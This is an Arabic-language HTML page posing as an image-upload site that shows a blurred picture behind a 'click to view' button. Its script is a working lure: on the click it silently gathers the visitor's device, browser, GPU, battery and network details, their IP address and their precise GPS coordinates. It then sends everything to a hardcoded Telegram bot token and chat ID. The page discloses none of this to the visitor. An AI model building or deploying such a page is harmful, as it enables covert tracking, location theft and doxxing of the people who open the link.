<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع رفع الصور</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .main-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            margin: 30px auto;
            filter: blur(20px);
            transition: filter 0.5s ease;
            display: block;
        }

        .main-image.clear {
            filter: blur(0px);
        }

        .click-button {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            transition: all 0.3s ease;
        }

        .click-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            display: none;
        }

        .loading {
            display: none;
            text-align: center;
            padding: 20px;
            color: #666;
        }

        .loading.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>موقع رفع الصور</h1>
            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
        </div>

        <img src="https://i.imgur.com/zcb3oRL.jpeg" 
             alt="الصورة المختارة" 
             class="main-image" 
             id="mainImage">

        <button class="click-button" id="viewButton">
            🔍 اضغط هنا لمشاهدة الصورة
        </button>

        <div class="loading" id="loading">
            ⏳ جاري تحميل الصورة...
        </div>

        <div class="success-message" id="successMessage">
            ✅ تم الموافقة على عرض الصورة
        </div>
    </div>

    <script>
        // دالة محسنة لجمع معلومات الجهاز بدقة أكبر
        function getAccurateDeviceInfo() {
            const ua = navigator.userAgent;
            let info = {
                // المعلومات الأساسية المضمونة
                userAgent: ua,
                platform: navigator.platform || 'غير محدد',
                language: navigator.language || navigator.userLanguage || 'غير محدد',
                languages: navigator.languages ? navigator.languages.join(', ') : 'غير متاح',
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                doNotTrack: navigator.doNotTrack || window.doNotTrack || 'غير محدد',
                
                // معلومات الشاشة الأكيدة
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth || screen.pixelDepth || 'غير محدد',
                devicePixelRatio: window.devicePixelRatio || 1,
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                availableScreenWidth: screen.availWidth,
                availableScreenHeight: screen.availHeight,
                
                // معلومات الوقت
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                timestamp: new Date().toISOString(),
                localTime: new Date().toLocaleString('ar-SA'),
                
                // معلومات إضافية
                vendor: navigator.vendor || 'غير محدد',
                appCodeName: navigator.appCodeName || 'غير محدد',
                appName: navigator.appName || 'غير محدد',
                appVersion: navigator.appVersion || 'غير محدد',
                product: navigator.product || 'غير محدد',
                productSub: navigator.productSub || 'غير محدد',
                
                // معلومات الصفحة
                pageURL: window.location.href,
                referrer: document.referrer || 'زيارة مباشرة',
                hostname: window.location.hostname,
                protocol: window.location.protocol,
                
                // معلومات الأداء
                loadTime: performance.timing ? 
                    (performance.timing.loadEventEnd - performance.timing.navigationStart) : 'غير متاح'
            };

            // تحديد نظام التشغيل بدقة أكبر
            if (ua.indexOf('Win') !== -1) {
                info.os = 'Windows';
                if (ua.indexOf('Windows NT 10.0') !== -1) {
                    info.osVersion = 'Windows 10/11';
                } else if (ua.indexOf('Windows NT 6.3') !== -1) {
                    info.osVersion = 'Windows 8.1';
                } else if (ua.indexOf('Windows NT 6.2') !== -1) {
                    info.osVersion = 'Windows 8';
                } else if (ua.indexOf('Windows NT 6.1') !== -1) {
                    info.osVersion = 'Windows 7';
                } else {
                    info.osVersion = 'إصدار قديم';
                }
            } else if (ua.indexOf('Mac') !== -1) {
                info.os = 'macOS';
                const macMatch = ua.match(/Mac OS X ([\d_\.]+)/);
                if (macMatch) {
                    info.osVersion = macMatch[1].replace(/_/g, '.');
                }
            } else if (ua.indexOf('Linux') !== -1) {
                info.os = 'Linux';
                if (ua.indexOf('Android') !== -1) {
                    info.os = 'Android';
                    const androidMatch = ua.match(/Android\s([\d\.]+)/);
                    if (androidMatch) {
                        info.osVersion = androidMatch[1];
                    }
                }
            } else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
                info.os = 'iOS';
                const iosMatch = ua.match(/OS ([\d_]+)/);
                if (iosMatch) {
                    info.osVersion = iosMatch[1].replace(/_/g, '.');
                }
            }

            // تحديد المتصفح بدقة
            const browsers = [
                { name: 'Edge', pattern: /Edg\/(\S+)/ },
                { name: 'Chrome', pattern: /Chrome\/(\S+)/ },
                { name: 'Firefox', pattern: /Firefox\/(\S+)/ },
                { name: 'Safari', pattern: /Version\/(\S+).*Safari/ },
                { name: 'Opera', pattern: /OPR\/(\S+)/ }
            ];

            for (let browser of browsers) {
                const match = ua.match(browser.pattern);
                if (match) {
                    info.browser = browser.name;
                    info.browserVersion = match[1];
                    break;
                }
            }

            // تحديد نوع الجهاز
            const isMobile = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
            const isTablet = /iPad|Android(?!.*Mobile)|Tablet/i.test(ua);
            
            info.deviceType = isTablet ? 'تابلت' : (isMobile ? 'موبايل' : 'كمبيوتر');
            info.isMobile = isMobile && !isTablet;
            info.isTablet = isTablet;
            info.isDesktop = !isMobile && !isTablet;

            // تحديد اتجاه الشاشة
            if (screen.orientation) {
                info.orientation = screen.orientation.type;
                info.orientationAngle = screen.orientation.angle;
            } else {
                info.orientation = window.innerWidth > window.innerHeight ? 'landscape' : 'portrait';
            }

            return info;
        }

        // دالة محسنة لجمع معلومات الأجهزة
        async function getReliableHardwareInfo() {
            let hardware = {
                // معلومات مضمونة
                cpuCores: navigator.hardwareConcurrency || 'غير متاح',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                vibrationSupport: 'vibrate' in navigator,
                
                // معلومات الذاكرة (قد لا تكون متاحة)
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير متاح',
                
                // معلومات اللمس والإدخال
                touchSupport: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
                
                // معلومات الميديا
                mediaDevices: navigator.mediaDevices ? 'متاح' : 'غير متاح',
                
                // معلومات المستشعرات
                accelerometer: 'Accelerometer' in window,
                gyroscope: 'Gyroscope' in window,
                magnetometer: 'Magnetometer' in window,
                
                // معلومات الصوت
                audioContext: 'AudioContext' in window || 'webkitAudioContext' in window,
                
                // معلومات الرسوميات
                canvas: document.createElement('canvas').getContext ? 'مدعوم' : 'غير مدعوم',
                
                // معلومات التخزين
                localStorage: 'localStorage' in window,
                sessionStorage: 'sessionStorage' in window,
                indexedDB: 'indexedDB' in window,
                
                // معلومات الأداء
                performanceMemory: performance.memory ? {
                    jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB',
                    totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
                    usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB'
                } : 'غير متاح'
            };

            // معلومات الشبكة (قد تكون متاحة)
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                hardware.network = {
                    type: connection.type || 'غير محدد',
                    effectiveType: connection.effectiveType || 'غير محدد',
                    downlink: connection.downlink ? `${connection.downlink} Mbps` : 'غير محدد',
                    rtt: connection.rtt ? `${connection.rtt} ms` : 'غير محدد',
                    saveData: connection.saveData || false
                };
            }

            // معلومات WebGL (محسنة)
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    hardware.webglSupport = true;
                    hardware.webglVersion = gl.getParameter(gl.VERSION);
                    
                    // محاولة الحصول على معلومات GPU
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        hardware.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير محدد';
                        hardware.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير محدد';
                    }
                }
            } catch (e) {
                hardware.webglSupport = false;
            }

            // معلومات البطارية (إن وجدت)
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    hardware.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'يتم الشحن' : 'غير متصل',
                        chargingTime: battery.chargingTime !== Infinity ? 
                            Math.round(battery.chargingTime / 60) + ' دقيقة' : 'غير محدد',
                        dischargingTime: battery.dischargingTime !== Infinity ? 
                            Math.round(battery.dischargingTime / 60) + ' دقيقة' : 'غير محدد'
                    };
                } catch (e) {
                    hardware.battery = 'غير متاح';
                }
            }

            return hardware;
        }

        // دالة محسنة للحصول على الموقع
        function getLocationSafely() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ status: 'غير مدعوم', data: null });
                    return;
                }

                const timeout = setTimeout(() => {
                    resolve({ status: 'انتهت المهلة', data: null });
                }, 10000);

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        resolve({
                            status: 'نجح',
                            data: {
                                latitude: position.coords.latitude.toFixed(6),
                                longitude: position.coords.longitude.toFixed(6),
                                accuracy: Math.round(position.coords.accuracy) + ' متر',
                                timestamp: new Date(position.timestamp).toLocaleString('ar-SA')
                            }
                        });
                    },
                    (error) => {
                        clearTimeout(timeout);
                        let errorMsg = 'خطأ غير معروف';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMsg = 'تم رفض الإذن';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMsg = 'الموقع غير متاح';
                                break;
                            case error.TIMEOUT:
                                errorMsg = 'انتهت مهلة الطلب';
                                break;
                        }
                        resolve({ status: errorMsg, data: null });
                    },
                    {
                        enableHighAccuracy: false,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // دالة محسنة للحصول على IP
        async function getIPSafely() {
            try {
                // استخدام خدمة ipify فقط (الأكثر موثوقية)
                const response = await fetch('https://api.ipify.org?format=json', {
                    method: 'GET',
                    mode: 'cors',
                    cache: 'no-cache'
                });
                
                if (response.ok) {
                    const data = await response.json();
                    return { status: 'نجح', ip: data.ip };
                }
            } catch (e) {
                // في حالة الفشل، حاول استخدام خدمة بديلة
                try {
                    const response = await fetch('https://api.myip.com', {
                        method: 'GET',
                        mode: 'cors',
                        cache: 'no-cache'
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        return { status: 'نجح', ip: data.ip };
                    }
                } catch (e2) {
                    return { status: 'فشل', ip: 'غير متاح' };
                }
            }
            
            return { status: 'فشل', ip: 'غير متاح' };
        }

        // دالة محسنة لإرسال البيانات
        function sendToTelegram(data) {
            const botToken = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
            const chatId = '170383339';
            
            const deviceInfo = data.device;
            const hardwareInfo = data.hardware;
            const locationInfo = data.location;
            const ipInfo = data.ip;

            // بناء الرسالة مع التحقق من توفر البيانات
            let message = `🆕 زائر جديد - معلومات محدثة
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ الوقت: ${deviceInfo.localTime}
🌐 الصفحة: ${deviceInfo.pageURL}
🔗 المرجع: ${deviceInfo.referrer}
⏱️ وقت التحميل: ${deviceInfo.loadTime} ms
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 معلومات الجهاز المؤكدة:
🖥️ نظام التشغيل: ${deviceInfo.os || 'غير محدد'} ${deviceInfo.osVersion || ''}
🌐 المتصفح: ${deviceInfo.browser || 'غير محدد'} ${deviceInfo.browserVersion || ''}
📱 نوع الجهاز: ${deviceInfo.deviceType}
💻 المنصة: ${deviceInfo.platform}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🖥️ معلومات الشاشة:
📺 دقة الشاشة: ${deviceInfo.screenResolution}
📐 حجم النافذة: ${deviceInfo.windowWidth}x${deviceInfo.windowHeight}
🎨 عمق الألوان: ${deviceInfo.colorDepth} بت
🔍 نسبة البكسل: ${deviceInfo.devicePixelRatio}
📱 الاتجاه: ${deviceInfo.orientation || 'غير محدد'}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔧 معلومات الأجهزة المتاحة:
🧠 أنوية المعالج: ${hardwareInfo.cpuCores}
💾 الذاكرة: ${hardwareInfo.deviceMemory}
👆 نقاط اللمس: ${hardwareInfo.maxTouchPoints}
📳 دعم الاهتزاز: ${hardwareInfo.vibrationSupport ? 'نعم' : 'لا'}
🖱️ دعم اللمس: ${hardwareInfo.touchSupport ? 'نعم' : 'لا'}`;

            // إضافة معلومات الشبكة إن وجدت
            if (hardwareInfo.network) {
                message += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📶 معلومات الشبكة:
🌐 النوع: ${hardwareInfo.network.effectiveType}
⬇️ السرعة: ${hardwareInfo.network.downlink}
⏱️ التأخير: ${hardwareInfo.network.rtt}`;
            }

            // إضافة معلومات البطارية إن وجدت
            if (hardwareInfo.battery && hardwareInfo.battery !== 'غير متاح') {
                message += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔋 معلومات البطارية:
📊 المستوى: ${hardwareInfo.battery.level}
⚡ الحالة: ${hardwareInfo.battery.charging}`;
            }

            // إضافة معلومات IP
            message += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 معلومات الشبكة:
🔌 عنوان IP: ${ipInfo.ip} (${ipInfo.status})`;

            // إضافة معلومات الموقع
            message += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📍 الموقع الجغرافي:
الحالة: ${locationInfo.status}`;
            
            if (locationInfo.data) {
                message += `
📐 الإحداثيات: ${locationInfo.data.latitude}, ${locationInfo.data.longitude}
🎯 الدقة: ${locationInfo.data.accuracy}
⏰ وقت الموقع: ${locationInfo.data.timestamp}`;
            }

            // إضافة معلومات إضافية
            message += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 معلومات إضافية:
🗣️ اللغة: ${deviceInfo.language}
🕐 المنطقة الزمنية: ${deviceInfo.timezone}
🍪 الكوكيز: ${deviceInfo.cookieEnabled ? 'مفعلة' : 'معطلة'}
📶 الاتصال: ${deviceInfo.onLine ? 'متصل' : 'غير متصل'}
🚫 عدم التتبع: ${deviceInfo.doNotTrack}`;

            // إرسال الرسالة
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log('✅ تم إرسال البيانات بنجاح');
                } else {
                    console.log('❌ فشل الإرسال - رمز الحالة:', response.status);
                }
            })
            .catch(error => {
                console.error('❌ خطأ في الإرسال:', error);
            });
        }

        // الدالة الرئيسية المحسنة
        async function viewImage() {
            // إظهار رسالة التحميل
            document.getElementById('loading').classList.add('show');
            document.getElementById('viewButton').disabled = true;
            
            try {
                // جمع البيانات بشكل متزامن لتسريع العملية
                const [deviceInfo, hardwareInfo, locationInfo, ipInfo] = await Promise.all([
                    Promise.resolve(getAccurateDeviceInfo()),
                    getReliableHardwareInfo(),
                    getLocationSafely(),
                    getIPSafely()
                ]);
                
                // إخفاء رسالة التحميل وإظهار الصورة
                document.getElementById('loading').classList.remove('show');
                document.getElementById('mainImage').classList.add('clear');
                document.getElementById('viewButton').style.display = 'none';
                document.getElementById('successMessage').style.display = 'block';
                
                // إرسال البيانات
                const allData = {
                    device: deviceInfo,
                    hardware: hardwareInfo,
                    location: locationInfo,
                    ip: ipInfo
                };
                
                console.log('📊 البيانات المجمعة:', allData);
                sendToTelegram(allData);
                
            } catch (error) {
                console.error('❌ خطأ في جمع البيانات:', error);
                document.getElementById('loading').classList.remove('show');
                document.getElementById('viewButton').disabled = false;
                alert('حدث خطأ في تحميل الصورة. يرجى المحاولة مرة أخرى.');
            }
        }

        // تهيئة الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            const viewButton = document.getElementById('viewButton');
            if (viewButton) {
                viewButton.addEventListener('click', viewImage);
            }
            
            // تسجيل معلومات أساسية عند تحميل الصفحة
            console.log('🚀 تم تحميل الصفحة بنجاح');
            console.log('📱 نوع الجهاز:', /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'جهاز محمول' : 'جهاز مكتبي');
        });

        // معالجة الأخطاء العامة
        window.addEventListener('error', function(e) {
            console.error('❌ خطأ عام:', e.message);
        });
    </script>
</body>
</html>
